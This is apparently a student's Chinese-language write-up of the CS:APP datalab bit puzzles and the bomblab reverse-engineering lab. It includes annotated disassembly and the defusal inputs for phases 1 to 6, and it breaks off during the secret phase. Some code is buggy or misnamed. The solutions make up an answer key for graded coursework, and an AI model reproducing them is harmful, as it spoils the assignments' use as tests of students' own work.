## lab1-datalab ##

学到很多

### 前置知识： ###
	~ ：非运算符 如 ~0010 = 1101
	& ：与运算符 如 0010 & 1110 = 0010
	| ：或运算符 如 0010 | 1110 = 1110
	^ ：异或运算符 如 1001 ^ 0110 = 1111
	! ：逻辑非运算符 如 !0 = 1 !1 = 0
	&&:逻辑与运算符 如 1 && 1 = 1 1 && 0 =0
	||：逻辑或运算符 如 1 || 0 = 1 
	>>: 右移运算符 逻辑右移(不考虑符号位) 如0100 >> 2 = 0001
				  算术右移(考虑符号位，是什么补什么) 如 1001 >> 2 = 1110
	<<: 左移运算符 如 1001 1001 << = 0110 0100

### 浮点数 ###
计算方法float=(-1)^s * M * 2^E 
float的表示方法，1个二进制位表示符号s，8个二进制位表示阶码(e为无符号数)，23个二进制位表示小数部分(f)
(规格化数，即e!=0,且e!=255)E = e - Bias		Bias =2^(k-1) - 1,
举个栗子，e 为 1111  1110 ,此时 Bias = 127, e = 254 - 127 = 127
假设 M 为 1 00 0000 0000 0000 0000 0000
M = 1 + f ，f部分为f = 1 * 2^-1  …… + 0 = 0.5
用小数点表示 M 即 1.100000……000
(非规格化数)E = 1 - Bias, M = f = 1


### xor ###
题目要求只是用 ~ 和 & 来实现 异或 即 ^, 本质就是相同位取1、不同位取0，而每一位又只有0或1，
感觉我是试出来的
如下
即
```c
int bitXor(int x, int y) {
  return ~(~(~x&y)&~(~y&x));

// 1111 0011 1111 x
// 1001 1000 0001 y

// 0000 1100 0000 ~x
// 0110 0111 1110 ~y

// 0000 1000 0000 ~x&y
// 0110 0011 1110 ~y&x

// 1111 0111 1111 ~(~x&y)
// 1001 1100 0001 ~(~y&x)

// 1001 0100 0001
// 0110 1011 1110 reuslt
//~(~(~x&y)&~(~y&x))
}
```

### 返回最小二进制整数 ###
最小二进制整数即符号位为1，其它位都为0，int占4个byte，一个byte占8个二进制位
```c
int tmin(void) {
  return 1<<31;
}
```

### 判断x是否位最大二进制整数 ###
最大二进制整数即上一个结果取反，题目要求是返回1，否返回0
思路：0x7fffffff + 1 = ~ 0x7fffffff,有个特例是x为-1的时候，!(!(x^-1))这个为特判
```c
int isTmax(int x) {
  return !((x+1)^(~x))&!(!(x^-1));
}
```

### 所有奇数位为1返回1，否则返回0 ###
案例为：allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
思路:先得到0xaaaa，然后再异或两次就可以了，一开始没注意<< 和 + 的优先级，一直错了
```c
int allOddBits(int x) {
  int temp=0xaa+(0xaa<<8);//0xaaaa
  return !((x&temp)^temp)&!(((x>>16)&temp)^temp);
}
```

### 返回相反数 ###
1的二进制形式是0000 0001 -1的二进制形式1111 1111,从 x + -x -1 == 1111 1111(2) 可以直接看出来 -x = ~ x + 1 
```c
int negate(int x) {
  return ~x+1;
}
```

### 若 0x30<=x<=0x39返回1，否则返回0 ###
9=(1001)(2)
3=(0011)(2)
思路:先判断0x30和0x39中相同的3，即0011，此然后再判断后一位，后一位有两种情况：
1.1xxx --> !(x>>1&1|x>>2&1)
2.0xxx --> !(x>>3&1)
```c
int isAsciiDigit(int x) {
  return !(x>>4^3)&(!(x>>3&1)|!(x>>1&1|x>>2&1));
}
```

### 使用运算符表示？： ###
例子：conditional(2,4,5) = 4
思路:突然想到一个特别关键的点，然后就做出来了，1往左移31位，得到最小整数，再往右移，此时因为
符号位为1，再往右移31位得到的就是-1,而先往左移，再往右移0，还是0，这样就可以很好的表示* 0 和* 1
如下
```c
int conditional(int x, int y, int z) {
  x=!x;
  x=x<<31;
  x=x>>31;
  return (y&~x)+(z&x);
}
```

### x<=y返回1，否则返回0 ###
两种情况：
	1.x==y
	2.x!=y 这种情况有好几种判断，最开始是总的1判断，用y-x判断符号位(理论上y>x,y-x,的符号位为1，但是0-0x80000000符号位为1，所以要加一个判断正负)
	此时还有一种情况没考虑到，就是y<0,x>0时，再加一个判断条件就可以了
```c
int isLessOrEqual(int x, int y) {
   int temp=!(x^y)&1;//判断相等 
   	printf("%d ",temp);
    temp=temp | !((y+(~x)+1)>>31);//判断大小
    printf("%d ",temp);
    temp=temp | ((x>>31)&~y>>31);//判断正负
   	printf("%d ",temp);
	temp=temp & !(y>>31&~(x>>31)&1);
	printf("%d ",temp);
   return temp;
}
```

### 实现!运算符 ###
原理是~ 0 + 1 = 0,0取相反数还是0，符号位还是0，而别的数符号位为1，0或1，1的组合
```c
int logicalNeg(int x) {
 return ((x>>31)&1|((~x+1)>>31)&1)^1;
}
```

### 返回x用补码表示的最小位数 ###
这个题我初步的思路是有了，但是怎么不超过Max ops，我没想到……
看c部分就很容易理解了
```c
int howManyBits(int x) {
	int s,c1,c2,c3,c4,c5,c6;
	int cnt = 0;	// 	计数
	s = (x>>31)&1;	//	符号位
	x = ((s<<31)>>31) ^ x; // 取反x
	s = !!(x>>16);	// 判断高16位是否有1，有则s为1
	c1 = s<<4;		// 若高16位有1，则低16位可以计数16
	x >>= c1;		// 右移将已经计数的位移除，c1若为0，则用折半的长度判断
	s = !!(x>>8);	// 用8位的长度去判断，有效位的个数计入c2
	c2 = s<<3;
	x >>= c2;
	s = !!(x>>4);	// 用4位的长度去判断，有效位的个数计入c3
	c3 = s<<2;
	x >>= c3;
	s = !!(x>>2);	// 用2位的长度去判断，有效位的个数计入c4
	c4 = s<<1;
	x >>= c4;
	s = !!(x>>1);	// 用1位的长度去判断，有效位的个数计入c5
	c5 = s;
	x >>= c5;
	c6 = !!x;		// 判断最低位是否为1
	cnt = c1+c2+c3+c4+c5+c6+1;	// 将每次获得的低位有效位相加，再加1位符号位
	return cnt;
}
```

### 返回2* f(浮点数) ###
这个题写了一两天人麻了，
关于浮点数，float的话，1位表正负(s)，8位表示阶码(e)，还有23位表示小数位(f)
* 2有三种情况:
	1.返回它本身，如NaN,0,1<<31……
	2.是e部分* 2
	3.小数位* 2(e部分为0)
```c
unsigned floatScale2(unsigned uf) {
  unsigned s=((uf>>31)<<31);
  unsigned v=(0x1ff)<<23;
  unsigned temp=uf<<1;
  temp=temp>>24;//temp 表示 e
  unsigned var=uf<<9;//var 表示 小数位
  if((temp==255&&(((var>>31)&1)==1||var==0))){
  		return uf;//判断NaN的情况，以及0x7f800000
  }
  else{
	  if(var==0){//小数位为0
	  	  if(temp==0) //判断1000   0000 …… 0000
			return uf;  
	  	  temp+=1;//*2
		  temp=temp<<23;
		  return temp|s;//符号位
      }
  	  else{
  	  	if(temp==0){//exp为0
			return 2*uf|s;//82
		}
  	  	return (((temp+1)<<23)+(var>>9))|s;//exp不为0,小数位不变
		}
  	  
  }
}
```

### 返回int(float) ###
感觉上面那个题能写出来，这个也能写出来
float返回int，主要就是超出范围，还有NaN，返回0x80000000,然后根据exp部分的大小计算就可以了
并且exp部分最大为(规范化数)，511，当 511 - 256 ( 2 * 7 - 1 ) >= 32 时，int就无法表达了，这时
需要返回0x80000000,而属于int范围中的数直接将temp转化成整数，大于127再算2^temp就可以了
```c
int floatScale2(unsigned uf) {
  unsigned s=uf>>31;
  unsigned v=(0x1ff)<<23;
  unsigned temp=uf<<1;
  temp=temp>>24;
  unsigned var=uf<<9;
  int re=temp;
  int count=0;
  int result=1;
  if(re==0)
	return 0;
  else{
  	if(re==255)
  		return 1<<31;
  	else{
  		re-=127;
  		if(re<0)
  		return 0;
		if(re>=32)
		return 1<<31;
  		while(re>0){
  			result*=2;
  			re--;
		  }
		  if(s==1){
		  	return result*-1;
		  }
		  else return result;
  		
	}
  }
}
```
### 返回x的x次方 ###
我理解的题目的意思是通过exp部分来实现2的x次方，但是x为负数返回0，感觉很奇怪，而且我本地还打不通，不能返回0
，太离谱了，思路很简单
```c
unsigned floatPower2(int x) {
    unsigned INF = 0xff << 23;
	int e = 127 + x;
	if (x < 0)
		return 0;
	if (e >= 255)
		return INF;
	return e << 23;
}
```
最后得分28分，就差两个题......

## lab2-bomblab ##
### phase1 ###
根据bomb.c使用命令 objdump -d bomb 看反汇编代码
phase1汇编如下
```c
0000000000400ee0 <phase_1>:
  400ee0:	48 83 ec 08          	sub    $0x8,%rsp
  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi esi主要用做程序的第二个参数
  400ee9:	e8 4a 04 00 00       	callq  401338 <strings_not_equal>
  400eee:	85 c0                	test   %eax,%eax 相当与AND eax,eax eax主要用来存储返回值
  400ef0:	74 05                	je     400ef7 <phase_1+0x17> ZF为1跳转
  400ef2:	e8 43 05 00 00       	callq  40143a <explode_bomb>
  400ef7:	48 83 c4 08          	add    $0x8,%rsp
  400efb:	c3                   	retq   test会设置ZF标志位，eax为0，则ZF为1
```
显然esi就是需要比较的字符串，然后使用gdb调试，x/10s 0x402400看一下，如下
```c
0x402400:	"Border relation"...
0x40240f:	"s with Canada h"...
0x40241e:	"ave never been "...
0x40242d:	"better."
```
字符串合并起来就是"Border relations with Canada have never been better."
然后再运行一下bomb，结果就是上面那个字符串

### phase2 ###
查看phase2的汇编，看函数名字大概能猜到，这里要读入6个整数，不确定的话可以查看read_six_numbers的汇编
```c
0000000000400efc <phase_2>:
  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
  400f05:	e8 52 05 00 00       	callq  40145c <read_six_numbers>
  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp) 				rsp和1比较，这里必须为1
  400f0e:	74 20                	je     400f30 <phase_2+0x34> 	ZF为1即rsp==1跳转
  400f10:	e8 25 05 00 00       	callq  40143a <explode_bomb>
  400f15:	eb 19                	jmp    400f30 <phase_2+0x34>
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax 			eax = rbx - 4 = rsp
  400f1a:	01 c0                	add    %eax,%eax 				eax = eax * 2 = 2(见0x400f0a)
  400f1c:	39 03                	cmp    %eax,(%rbx) 				rsp  和 rsp + 4
  400f1e:	74 05                	je     400f25 <phase_2+0x29>	和前面一样rsp + 4 必须为2
  400f20:	e8 15 05 00 00       	callq  40143a <explode_bomb>
  400f25:	48 83 c3 04          	add    $0x4,%rbx				rbx = rsp + 8
  400f29:	48 39 eb             	cmp    %rbp,%rbx				判断比较次数，不相等继续比较
  400f2c:	75 e9                	jne    400f17 <phase_2+0x1b>
  400f2e:	eb 0c                	jmp    400f3c <phase_2+0x40>
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx 			rbx = rsp + 4
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp 			rbp = rsp + 0x18
  400f3a:	eb db                	jmp    400f17 <phase_2+0x1b>
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
  400f40:	5b                   	pop    %rbx
  400f41:	5d                   	pop    %rbp
  400f42:	c3                   	retq   
```
read_six_numbers的汇编
```c
   0x40145c <read_six_numbers>:	sub    rsp,0x18
   0x401460 <read_six_numbers+4>:	mov    rdx,rsi
   0x401463 <read_six_numbers+7>:	lea    rcx,[rsi+0x4]
   0x401467 <read_six_numbers+11>:	lea    rax,[rsi+0x14]
   0x40146b <read_six_numbers+15>:	mov    QWORD PTR [rsp+0x8],rax
   0x401470 <read_six_numbers+20>:	lea    rax,[rsi+0x10]
   0x401474 <read_six_numbers+24>:	mov    QWORD PTR [rsp],rax
   0x401478 <read_six_numbers+28>:	lea    r9,[rsi+0xc]
   0x40147c <read_six_numbers+32>:	lea    r8,[rsi+0x8]
   0x401480 <read_six_numbers+36>:	mov    esi,0x4025c3
   0x401485 <read_six_numbers+41>:	mov    eax,0x0
   0x40148a <read_six_numbers+46>:	call   0x400bf0 <__isoc99_sscanf@plt>
   0x40148f <read_six_numbers+51>:	cmp    eax,0x5
   0x401492 <read_six_numbers+54>:	jg     0x401499 <read_six_numbers+61>
   0x401494 <read_six_numbers+56>:	call   0x40143a <explode_bomb>
   0x401499 <read_six_numbers+61>:	add    rsp,0x18
   0x40149d <read_six_numbers+65>:	ret
```
esi为sscanf的参数用x/10s，看一下，正好为6个%d,如下
```c
0x4025c3:	"%d %d %d %d %d "...
0x4025d2:	"%d"
```
此时知道了输入数据的类型数量，然后再仔细看看phase2函数,这里基本就要一条一条指令仔细的分析了
分析过程见phase函数，最后 rsp == 1 ,rsp + 4 == 2 ,rsp + 8 == 4 ,rsp + 16 == 8,rsp + 20 == 16,
rsp + 24 ==32,此时基本可以推断输入序列为 1 2 4 8 16 32了

### phase3 ###
还是和之前一样，看phase3函数
```c
0000000000400f43 <phase_3>:
  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi 从这里查看0x4025cf 可以知道是输入两个整数
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	callq  400bf0 <__isoc99_sscanf@plt> 
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a <phase_3+0x27> ssaanf的返回值必须为2，>0则jg跳转
  400f65:	e8 d0 04 00 00       	callq  40143a <explode_bomb>
  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad <phase_3+0x6a> rsp+0x8 大于 7 跳转 到explode
  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax  		 eax = rsp+0x8
  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)    寻址为0x402470+rax*8
  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax
  400f81:	eb 3b                	jmp    400fbe <phase_3+0x7b>
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax
  400f88:	eb 34                	jmp    400fbe <phase_3+0x7b>
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax
  400f8f:	eb 2d                	jmp    400fbe <phase_3+0x7b>
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax
  400f96:	eb 26                	jmp    400fbe <phase_3+0x7b>
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax
  400f9d:	eb 1f                	jmp    400fbe <phase_3+0x7b>
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax
  400fa4:	eb 18                	jmp    400fbe <phase_3+0x7b>
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax
  400fab:	eb 11                	jmp    400fbe <phase_3+0x7b>
  400fad:	e8 88 04 00 00       	callq  40143a <explode_bomb>
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  400fb7:	eb 05                	jmp    400fbe <phase_3+0x7b>
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 <phase_3+0x86>
  400fc4:	e8 71 04 00 00       	callq  40143a <explode_bomb>
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
  400fcd:	c3                   	retq   
```
这个地方比较简单0x402470处对应的是0x400f7c,rax为0，然后再比较第二个数与0xcf
最后输入0 和 207就可以了

### phase4 ###
phase4的汇编如下
```c
000000000040100c <phase_4>:
  40100c:	48 83 ec 18          	sub    $0x18,%rsp
  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi 
  40101f:	b8 00 00 00 00       	mov    $0x0,%eax
  401024:	e8 c7 fb ff ff       	callq  400bf0 <__isoc99_sscanf@plt>
  401029:	83 f8 02             	cmp    $0x2,%eax
  40102c:	75 07                	jne    401035 <phase_4+0x29> 不相等跳explode
  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)
  401033:	76 05                	jbe    40103a <phase_4+0x2e> rsp+0x8<=14跳转
  401035:	e8 00 04 00 00       	callq  40143a <explode_bomb>
  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx 				参数3
  40103f:	be 00 00 00 00       	mov    $0x0,%esi 				参数2
  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi 			参数1
  401048:	e8 81 ff ff ff       	callq  400fce <func4>
  40104d:	85 c0                	test   %eax,%eax
  40104f:	75 07                	jne    401058 <phase_4+0x4c> eax为1跳
  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)          检查rsp+0xc是否为0
  401056:	74 05                	je     40105d <phase_4+0x51>
  401058:	e8 dd 03 00 00       	callq  40143a <explode_bomb>
  40105d:	48 83 c4 18          	add    $0x18,%rsp
  401061:	c3                   	retq   
```
这里还是输入两个整数，第一个整数需要<=14，然后看0x40104f部分，我们需要保证eax为0，然后看fun4函数
```c
0000000000400fce <func4>:
  400fce:	48 83 ec 08          	sub    $0x8,%rsp
  400fd2:	89 d0                	mov    %edx,%eax 		eax=14
  400fd4:	29 f0                	sub    %esi,%eax    	eax-=0
  400fd6:	89 c1                	mov    %eax,%ecx 		ecx=eax=14
  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx       ecx=0
  400fdb:	01 c8                	add    %ecx,%eax 		eax+=0
  400fdd:	d1 f8                	sar    %eax            	eax=7
  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx ecx=rax+rsi=7
  400fe2:	39 f9                	cmp    %edi,%ecx        
  400fe4:	7e 0c                	jle    400ff2 <func4+0x24> ecx <= edi
  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx
  400fe9:	e8 e0 ff ff ff       	callq  400fce <func4>
  400fee:	01 c0                	add    %eax,%eax
  400ff0:	eb 15                	jmp    401007 <func4+0x39>
  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax eax=0
  400ff7:	39 f9                	cmp    %edi,%ecx ecx>=edi
  400ff9:	7d 0c                	jge    401007 <func4+0x39> ecx>=edi 跳转
  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi
  400ffe:	e8 cb ff ff ff       	callq  400fce <func4>
  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax
  401007:	48 83 c4 08          	add    $0x8,%rsp
  40100b:	c3                   	retq  
```
这个部分最主要的就是mov 0,eax,这里需要保证eax为0，然后往回推，edi>=7,再往后推，即edi<=7,显然edi为7
最后答案为7 0

### phase5 ###
还是看汇编
```c
0000000000401062 <phase_5>:
  401062:	53                   	push   %rbx
  401063:	48 83 ec 20          	sub    $0x20,%rsp
  401067:	48 89 fb             	mov    %rdi,%rbx
  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax 看到这个是不是很熟悉,没错就是canary保护
  401071:	00 00 
  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  401078:	31 c0                	xor    %eax,%eax
  40107a:	e8 9c 02 00 00       	callq  40131b <string_length> 	这里一看就是输入字符串
  40107f:	83 f8 06             	cmp    $0x6,%eax 				字符串长度为6
  401082:	74 4e                	je     4010d2 <phase_5+0x70>    长度为6跳转
  401084:	e8 b1 03 00 00       	callq  40143a <explode_bomb>
  401089:	eb 47                	jmp    4010d2 <phase_5+0x70>
  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx  		ecx=参数1+rax
  40108f:	88 0c 24             	mov    %cl,(%rsp)               rsp=ecx(0~0xff)
  401092:	48 8b 14 24          	mov    (%rsp),%rdx 				rdx=rsp
  401096:	83 e2 0f             	and    $0xf,%edx          		edx=edx&0xf
  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx 		edx=0x4024b0+rdx
  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)    rdi+0x10+rax = edx(l)
  4010a4:	48 83 c0 01          	add    $0x1,%rax  				rax=1
  4010a8:	48 83 f8 06          	cmp    $0x6,%rax 				
  4010ac:	75 dd                	jne    40108b <phase_5+0x29>   	rax不为6跳
  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi
  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  4010bd:	e8 76 02 00 00       	callq  401338 <strings_not_equal>   这里rsp+0x10必须为flyers
  4010c2:	85 c0                	test   %eax,%eax
  4010c4:	74 13                	je     4010d9 <phase_5+0x77>
  4010c6:	e8 6f 03 00 00       	callq  40143a <explode_bomb>
  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4010d0:	eb 07                	jmp    4010d9 <phase_5+0x77>
  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax   				eax=0
  4010d7:	eb b2                	jmp    40108b <phase_5+0x29>
  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4010e5:	00 00 
  4010e7:	74 05                	je     4010ee <phase_5+0x8c>
  4010e9:	e8 42 fa ff ff       	callq  400b30 <__stack_chk_fail@plt>
  4010ee:	48 83 c4 20          	add    $0x20,%rsp
  4010f2:	5b                   	pop    %rbx
  4010f3:	c3                   	retq   
```
最核心部分为0x40108b处，那里是将输入的字符&0xf+0x4024b0得到的地址对应的字符依次与flyers，0x4024b0
对应的字符串为m a d u i e r s n f o t v b y l，f偏移为0x9，l偏移为0xf,y偏移为0xe,e偏移为0x5
r偏移为0x6，s偏移为0x7,上面的偏移为输入的字符&0xf得到的，对应的字符串为ionefg，只要字符16进制后一位对应
偏移怎么输都可以IONEFG

### phase6 ###
phase6汇编如下
```c
00000000004010f4 <phase_6>:
  4010f4:	41 56                	push   %r14
  4010f6:	41 55                	push   %r13
  4010f8:	41 54                	push   %r12
  4010fa:	55                   	push   %rbp
  4010fb:	53                   	push   %rbx
  4010fc:	48 83 ec 50          	sub    $0x50,%rsp
  401100:	49 89 e5             	mov    %rsp,%r13 				  r13=rsp
  401103:	48 89 e6             	mov    %rsp,%rsi     			  rsi=rsp
  401106:	e8 51 03 00 00       	callq  40145c <read_six_numbers>  读入6个数
  40110b:	49 89 e6             	mov    %rsp,%r14   				  r14=rsp
  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d   			  r12=0
  401114:	4c 89 ed             	mov    %r13,%rbp 				  rbp=r13=rsp
  401117:	41 8b 45 00          	mov    0x0(%r13),%eax  			  eax=r13=rsp
  40111b:	83 e8 01             	sub    $0x1,%eax 				  eax-=1
  40111e:	83 f8 05             	cmp    $0x5,%eax 			      eax ？ 5
  401121:	76 05                	jbe    401128 <phase_6+0x34>      eax即rsp<=6跳转
  401123:	e8 12 03 00 00       	callq  40143a <explode_bomb>
  401128:	41 83 c4 01          	add    $0x1,%r12d 				  r12=1
  40112c:	41 83 fc 06          	cmp    $0x6,%r12d                 
  401130:	74 21                	je     401153 <phase_6+0x5f>      r12==6跳
  401132:	44 89 e3             	mov    %r12d,%ebx 				  ebx=r12=1
  401135:	48 63 c3             	movslq %ebx,%rax          		  rax=ebx=1
  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax         eax=rsp + rax * 4
  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
  40113e:	75 05                	jne    401145 <phase_6+0x51>      rsp和rsp+4比较，不相等跳
  401140:	e8 f5 02 00 00       	callq  40143a <explode_bomb>
  401145:	83 c3 01             	add    $0x1,%ebx  				  ebx=2
  401148:	83 fb 05             	cmp    $0x5,%ebx 				  
  40114b:	7e e8                	jle    401135 <phase_6+0x41>      ebx<=5跳
  40114d:	49 83 c5 04          	add    $0x4,%r13                  r13=rsp+4
  401151:	eb c1                	jmp    401114 <phase_6+0x20>      
  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi     		  rsi=rsp+0x18
  401158:	4c 89 f0             	mov    %r14,%rax 				  rax=rsp
  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx                  ecx=7
  401160:	89 ca                	mov    %ecx,%edx 				  edx=ecx=7
  401162:	2b 10                	sub    (%rax),%edx                edx-=rsp
  401164:	89 10                	mov    %edx,(%rax)                rsp=edx
  401166:	48 83 c0 04          	add    $0x4,%rax  				  rax=rsp+4
  40116a:	48 39 f0             	cmp    %rsi,%rax                  rax不为rsp+0x18跳
  40116d:	75 f1                	jne    401160 <phase_6+0x6c>
  最复杂的部分，这里要好好分析
  40116f:	be 00 00 00 00       	mov    $0x0,%esi  				 esi=0
  401174:	eb 21                	jmp    401197 <phase_6+0xa3>      
  rsp=1		rsp+4=3 rsp+8=  rsp+0xc=  rsp+0x10=3    rsp+0x14=3
  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx            rdx=rdx+0x8
  40117a:	83 c0 01             	add    $0x1,%eax 				 eax+=1
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 <phase_6+0x82>     ecx!=eax跳
  401181:	eb 05                	jmp    401188 <phase_6+0x94>
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx     		 edx=0x6032d0      
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)    rsp+2*rsi+0x20=rdx
  40118d:	48 83 c6 04          	add    $0x4,%rsi                 rsi+=4
  401191:	48 83 fe 18          	cmp    $0x18,%rsi  				 rsi==0x18跳
  401195:	74 14                	je     4011ab <phase_6+0xb7>     必须要到这里
这里主要作用为为rsp+0x20到rsp+0x48分配0x6032d0+n
1对应0x6032d0  14c
2对应0x6032d8   a8
3对应0x6032e0  39c
4对应0x6033e8  2b3
5对应0x6033f0  1dd
6对应0x6033f8  1bb
这里我不是很清楚到底是直接赋地址，还是赋指针指向的地址(看ida上面是直接赋地址，后面会取两个指针)
从大到小是 3 4 5 6 1 2
对应初始值为 4 3 2 1 6 5

  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx        ecx=rsp+rsi=rsp
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 <phase_6+0x8f>     rsp+rsi<=1跳
  40119f	b8 01 00 00 00       	mov    $0x1,%eax    			 eax=1
  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx  			 edx=0x6032d0
  4011a9:	eb cb                	jmp    401176 <phase_6+0x82>   这是一条分界线
  这里需要根据下面分析得到的rsp+0x20>=rsp+0x28……>=rsp+0x48,来填充对应的值从小到大
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx         rbx=rsp+0x20
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax 		   rax=rsp+0x28
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi         rsi=rsp+0x40
  4011ba:	48 89 d9             	mov    %rbx,%rcx 			   rcx=rbx
  4011bd:	48 8b 10             	mov    (%rax),%rdx 			   rdx=rax
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)          rcx+8=rdx
  4011c4:	48 83 c0 08          	add    $0x8,%rax  			   rax+=8
  4011c8:	48 39 f0             	cmp    %rsi,%rax               rsp+0x28必须=rsp+0x40
  4011cb:	74 05                	je     4011d2 <phase_6+0xde>   rax必须等于rsi
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd <phase_6+0xc9>
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)          rdx+0x8=0
  4011d9:	00 

  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp 			   ebp=5
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax 		   rax=rbx+8=rsp+0x28
  4011e3:	8b 00                	mov    (%rax),%eax 			   eax=rax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee <phase_6+0xfa>   rsp+0x20>=rsp+0x28
  4011e9:	e8 4c 02 00 00       	callq  40143a <explode_bomb>
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx    	   rbx=rbx+0x8
  4011f2:	83 ed 01             	sub    $0x1,%ebp 			   ebp-=1
  4011f5:	75 e8                	jne    4011df <phase_6+0xeb>

  由上面有      	 	
  rsp+0x20>=rsp+0x28
  rsp+0x28>=rsp+0x30
  rsp+0x30>=rsp+0x38
  rsp+0x38>=rsp+0x40
  rsp+0x38>=rsp+0x48
  即rsp+0x20>=rsp+0x28>=rsp+0x30>=rsp+0x38>=rsp+0x40>=rsp+0x48

  4011f7:	48 83 c4 50          	add    $0x50,%rsp
  4011fb:	5b                   	pop    %rbx
  4011fc:	5d                   	pop    %rbp
  4011fd:	41 5c                	pop    %r12
  4011ff:	41 5d                	pop    %r13
  401201:	41 5e                	pop    %r14
  401203:	c3                   	retq   
```
前面主要是判断rsp-rsp+20是否大于6，最开始是rsp+4？rsp --> rsp+8?rsp+4 --> 
rsp+12?rsp+8 --> rsp+16?rsp+12 --> rsp+20? rsp+16,从这里还看不出什么
然后继续往后走，rsp到rsp+0x14 都被7减，rsp = 7 - rsp,rsp + 4 = 7 - (rsp+4)
这里再往后走分支太多了，应该逆推回去
最后的答案为4 3 2 1 6 5

### secret phase ###
还有一个隐藏的phase，这不得好好分析,汇编如下
```c
0000000000401242 <secret_phase>:
  401242:	53                   	push   %rbx
  401243:	e8 56 02 00 00       	callq  40149e <read_line>
  401248:	ba 0a 00 00 00       	mov    $0xa,%edx    	   参数3
  40124d:	be 00 00 00 00       	mov    $0x0,%esi           参数2
  401252:	48 89 c7             	mov    %rax,%rdi           参数1
  401255:	e8 76 f9 ff ff       	callq  400bd0 <strtol@plt>
  40125a:	48 89 c3             	mov    %rax,%rbx           rbx=rax
  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax     eax=rax-1
  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax         eax-1必须小于等于0x3e8
  401265:	76 05                	jbe    40126c <secret_phase+0x2a>
  401267:	e8 ce 01 00 00       	callq  40143a <explode_bomb>
  40126c:	89 de                	mov    %ebx,%esi           esi=ebx=rax
